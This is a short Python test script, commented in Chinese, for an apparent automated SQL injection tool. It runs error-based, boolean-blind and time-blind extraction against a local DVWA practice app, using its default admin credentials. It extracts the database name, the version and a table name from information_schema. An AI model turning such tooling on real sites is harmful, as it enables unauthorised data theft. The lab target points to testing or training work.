"""通道级测试：error / bool_blind / time_blind 的 scalar 取数。"""
import sys
sys.path.insert(0, ".")
from autosqli.core.engine import Engine
from autosqli.core.models import TargetSpec
from autosqli.cli import build_spec
import argparse


def main():
    args = argparse.Namespace(
        url="http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit",
        param="", method="GET", data=None, cookie=None, stage_url="",
        dvwa="admin:password", security="low", base_value="1", delay=0.0)
    spec = build_spec(args)
    engine = Engine(spec, log=lambda l, m: None)
    report = engine.analyze(scan_waf=False)

    for key in ("error", "bool_blind", "time_blind"):
        oracle = engine.build_oracle(report, key)
        if oracle is None:
            print(f"[{key}] 通道不可用")
            continue
        try:
            db = oracle.scalar("database()")
            ver = oracle.scalar("substr(version(),1,6)")
            t = oracle.scalar("(select table_name from information_schema.tables "
                              "where table_schema=database() limit 1,1)")
            print(f"[{key}] db={db!r} ver={ver!r} table[1]={t!r} requests={oracle.requests}")
        except Exception as e:
            print(f"[{key}] 失败: {e}")


if __name__ == "__main__":
    main()
